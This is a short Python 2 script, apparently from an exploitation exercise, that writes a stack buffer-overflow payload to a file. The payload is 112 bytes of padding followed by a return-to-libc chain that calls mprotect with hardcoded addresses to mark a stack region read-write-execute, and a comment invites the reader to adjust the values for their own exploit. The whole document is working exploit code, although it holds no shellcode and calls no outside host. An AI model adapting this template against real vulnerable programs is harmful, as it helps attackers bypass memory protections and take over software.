#!/usr/bin/env python2

import sys
import struct


def exploit() : 

    junk_length = 112

    # Variables related to calling mprotect.
    # NOTE: Change these values to suit your exploit. 
    mprotect_address = 0xf7ed5da0
    return_address = 0x63636363
    argument0 = 0xfffdc000
    argument1 = 139264
    argument2 = 7
    
    # First, fill in with required amount of junk.
    payload = junk_length * 'a'
    
    # mprotect's address in little-endian form. This will overwrite func's return address. 
    payload += struct.pack('<I', mprotect_address)
    
    # mprotect's return address
    payload += struct.pack('<I', return_address)

    # The 3 arguments, each in little-endian form. 
    payload += struct.pack('<I', argument0)
    payload += struct.pack('<I', argument1)
    payload += struct.pack('<I', argument2)
    
    f = open("exploit.txt", "wb")
    f.write(payload)
    f.close()


if __name__ == "__main__" : 
    exploit()
